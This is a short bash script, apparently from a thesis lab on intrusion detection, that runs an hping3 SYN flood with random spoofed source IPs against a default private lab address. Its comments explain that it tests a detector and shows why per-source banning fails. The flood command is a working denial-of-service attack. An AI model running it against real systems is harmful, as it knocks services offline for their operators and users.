#!/usr/bin/env bash
# Spoofed-source SYN flood -> DDoS family, with RANDOM source IPs per packet.
# Every packet appears to come from a new IP, so there is no stable source to attribute
# the attack to. The detector still CLASSIFIES the flood correctly, but this illustrates
# why per-source response (banning) is the wrong tool against spoofed floods —
# motivating upstream/rate-based mitigation (discuss in the thesis).
# NOTE: spoofing only works inside the isolated lab; real networks filter it (BCP38).
set -euo pipefail
TARGET="${TARGET:-172.30.0.10}"
PORT="${PORT:-80}"
DURATION="${DURATION:-15}"

echo "[spoofed_flood] random-source SYN flood -> ${TARGET}:${PORT} for ${DURATION}s"
echo "[spoofed_flood] expect: classified as attack, but no stable source IP to attribute"
if [ "${DURATION}" -gt 0 ]; then
  timeout "${DURATION}" hping3 -S --flood --rand-source -p "${PORT}" "${TARGET}" || true
else
  hping3 -S --flood --rand-source -p "${PORT}" "${TARGET}"
fi
echo "[spoofed_flood] done"
